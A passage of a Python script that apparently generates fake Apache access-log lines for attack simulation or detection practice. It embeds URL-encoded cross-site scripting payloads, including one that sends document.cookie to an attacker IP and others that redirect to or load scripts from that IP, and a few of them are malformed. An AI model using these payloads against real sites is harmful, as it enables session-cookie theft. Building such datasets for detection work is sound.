    ts = st.strftime('%d/%b/%Y:%H:%M:%S')
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    logger = logging.getLogger()
    logger.addHandler(logging.FileHandler(name, 'a'))
    dircho= "search/"
    xsschoice=random.randint(1,5)
    filechoice=random.randint(1,4)


    if filechoice == 1:
        dircho3="?name="
    elif filechoice == 2:
        dircho3="?search="
    elif filechoice == 3:
        dircho3="?file="
    elif filechoice == 4:
        dircho3="?p="

    if xsschoice == 1:
        attip()
        dircho2="%3Cscript%3Ewindow.location%3D'http%3A%2F%2F"+str(atip)+"%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E"
    elif xsschoice == 2:
        attip()
        dircho2="%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F"+str(atip)+"%22%3C%2Fscript%3E"
    elif xsschoice == 3:
        attip()
        malurl()
        dircho2="%3Cscript%3E%window.open%28%27http%3A%2F%2F"+str(atip)+"%2F"+str(murl)+"%27%293C%2Fscript%3E"
    elif xsschoice == 4:
        attip()
        malurl()
        dircho2="%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F"+str(atip)+"%2F"+str(murl)+".js%3D%3E%3C%2Fscript%3E"
    elif xsschoice == 5:
        dircho2="%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E"



    logger.info('%s - - [%s +0000] "%s /%s%s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho3,dircho2,resp,size,mysite,dircho,ag))

    t+=1
    if t >= 420:
        sec += 1
        t -= 420

    while sec>= 60:
        min+=1
        sec-=60
    while min>=60:
        hour+=1
        min=0
    while hour>=24:
        randate = randate + datetime.timedelta(days=1)
        hour=0

    traf +=1
    logger.handlers.clear()



Apache()

